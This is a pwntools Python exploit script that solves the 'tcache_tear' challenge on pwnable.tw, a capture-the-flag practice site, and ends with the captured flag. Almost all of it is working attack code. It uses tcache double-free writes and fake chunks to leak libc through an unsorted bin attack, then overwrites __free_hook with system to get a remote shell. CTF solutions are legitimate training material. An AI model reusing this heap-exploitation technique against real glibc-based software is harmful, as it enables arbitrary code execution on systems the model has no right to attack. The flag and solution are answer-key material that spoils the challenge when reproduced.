from pwn import *

elf = ELF("tcache_tear")
libc = ELF("libc-2.27.so")
bss = 0x602060
onegadget = 0x4f322
banner = b"Your choice :"

r = remote("chall.pwnable.tw", 10207)


def init(name):
    r.recvuntil(b"Name:")
    r.sendline(name)


def free():
    r.recvuntil(banner)
    r.sendline(b"2")


def malloc(size, data):
    r.recvuntil(banner)
    r.sendline(b"1")
    r.recvuntil(b"Size:")
    r.sendline(str(size).encode())
    r.recvuntil(b"Data:")
    r.sendline(data)


def info():
    r.recvuntil(banner)
    r.sendline(b"3")


def write(size, address, data):
    malloc(size, b'AAAA')
    free()
    free()
    malloc(size, p64(address))
    malloc(size, b'AAA')
    malloc(size, data)


with log.progress("Stage 1: Unsorted bin attack") as l:
    l.status("initialize heap")
    init(p64(0) + p64(0x501))
    
    l.status("creating fak chunks")
    write(0x50, bss + 0x500, (p64(0) + p64(0x21) + p64(0) * 2) * 2)
    write(0x60, bss + 0x10, b'A')
    free()
    l.success()

with log.progress("Stage 2: Leaking libc") as l:
    info()
    r.recvuntil(b"Name :")
    r.recv(0x10)
    leak = u64(r.recv(8))
    libc_base = leak - libc.sym['__malloc_hook'] - 0x70
    free_hook = libc_base + libc.sym['__free_hook']
    system = libc_base + libc.sym['system']
    log.info(f"leak: {hex(leak)}")
    log.info(f"free_hook: {hex(free_hook)}")
    l.success(hex(libc_base))

with log.progress("Stage 3: Overwriting __free_hook") as l:
    write(0x70, free_hook, p64(system))
    malloc(0x80, b"/bin/sh\x00")
    l.status("triggering free()")
    free()
    l.success()
r.interactive()

# FLAG --> FLAG{tc4ch3_1s_34sy_f0r_y0u}
